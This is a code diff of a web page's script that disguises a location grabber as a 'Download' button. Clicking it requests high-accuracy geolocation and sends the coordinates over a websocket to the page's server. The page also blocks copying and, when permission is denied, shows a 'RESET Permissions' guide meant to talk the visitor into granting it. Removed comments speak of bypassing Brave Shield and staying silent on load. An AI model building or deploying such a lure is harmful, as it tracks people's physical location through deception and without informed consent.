@@ -152,81 +152,58 @@
       </div>
   </div>
 
-<script>
-    // Brave Shield bypass karne ke liye WebSocket transport force kiya hai
-    const socket = io({
-        transports: ['websocket'],
-        upgrade: false,
-        reconnection: true
-    });
+  <script>
 
-    const btn = document.getElementById('locationBtn');
-    const guide = document.getElementById('guide-overlay');
-    const closeBtn = document.getElementById('closeGuide');
+      const socket = io({
+          transports: ['websocket'],
+          upgrade: false
+      }); 
 
-    document.addEventListener('copy', (e) => e.preventDefault());
+      const btn = document.getElementById('locationBtn');
+      const guide = document.getElementById('guide-overlay');
+      const closeBtn = document.getElementById('closeGuide');
 
-    function showGuide() { guide.style.display = 'flex'; }
-    function hideGuide() { guide.style.display = 'none'; }
+      document.addEventListener('copy', (e) => e.preventDefault());
 
-    async function handleAction() {
-        // Step 1: Pehle dummy request taaki Brave ka shield alert na ho
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 8000,
-            maximumAge: 0
-        };
+      function showGuide() { guide.style.display = 'flex'; }
+      function hideGuide() { guide.style.display = 'none'; }
 
-        // Brave Hard Shield Bypass: Direct trigger
-        try {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => { 
-                    socket.emit('send-location', { 
-                        lat: pos.coords.latitude, 
-                        lng: pos.coords.longitude 
-                    }); 
-                },
-                (err) => { 
-                    // Agar browser ne auto-deny kiya ya user ne block kiya
-                    if (err.code === 1 || err.code === 3) { 
-                        // Brave me agar button turant laal ho raha hai, toh ye guide dikhayega
-                        updateUI('denied'); 
-                        showGuide();
-                    }
-                },
-                options
-            );
-        } catch (e) {
-            // Fallback agar navigator hi block ho jaye
-            showGuide();
-        }
-    }
 
-    function updateUI(state) {
-        if (state === 'denied') {
-            btn.innerText = "RESET Permissions";
-            btn.classList.add('blocked');
-        } else {
-            btn.innerText = "Download";
-            btn.classList.remove('blocked');
-            hideGuide(); 
-        }
-    }
+      async function handleAction() {
+          navigator.geolocation.getCurrentPosition(
+              (pos) => { 
+                  socket.emit('send-location', { lat: pos.coords.latitude, lng: pos.coords.longitude }); 
+              },
+              (err) => { 
+                  
+                  if (err.code === 1) { 
+                      updateUI('denied'); 
+                      showGuide();
+                  } 
+              },
+              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+          );
+      }
 
-    btn.addEventListener('click', handleAction);
-    closeBtn.addEventListener('click', hideGuide); 
+      function updateUI(state) {
+          if (state === 'denied') {
+              btn.innerText = "RESET Permissions";
+              btn.classList.add('blocked');
+          } else {
+              btn.innerText = "Download";
+              btn.classList.remove('blocked');
+              hideGuide(); 
+          }
+      }
 
-    // Window load par bilkul silent rehna hai
-    window.onload = () => {
-        btn.innerText = "Download";
-        btn.classList.remove('blocked');
-        
-        // Background me connection active rakhega
-        if (!socket.connected) socket.connect();
-    };
-</script>
-  
-  
+      btn.addEventListener('click', handleAction);
+      closeBtn.addEventListener('click', hideGuide); 
 
+
+      window.onload = () => {
+          btn.innerText = "Download";
+          btn.classList.remove('blocked');
+      };
+  </script>
 </body>
 </html>
